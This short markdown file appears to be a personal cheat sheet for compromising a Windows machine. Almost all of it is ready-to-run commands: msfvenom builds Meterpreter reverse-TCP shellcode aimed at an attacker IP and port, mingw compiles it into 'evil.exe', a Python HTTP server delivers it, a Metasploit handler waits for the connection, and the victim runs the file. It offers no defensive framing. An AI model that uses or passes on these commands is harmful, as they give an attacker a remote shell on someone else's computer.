# Attacker server
- Create malicious shellcode by msfvenom
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.138 LPORT=4444 -f c > shellcode.txt
```
- Create a malicious C++ file
- Compile exe file from C++ file:
```bash
x86_64-w64-mingw32-g++ -o evil.exe evil.cpp -static-libgcc -static-libstdc++
```
- Run listening server
```bash
python -m http.server 80
msfconsole -x "use exploits/multi/handler; set lhost 192.168.119.138; set lport 4444; set payload windows/x64/meterpreter/reverse_tcp; exploit"

```

# Victime machine
```bash
.\evil.exe
```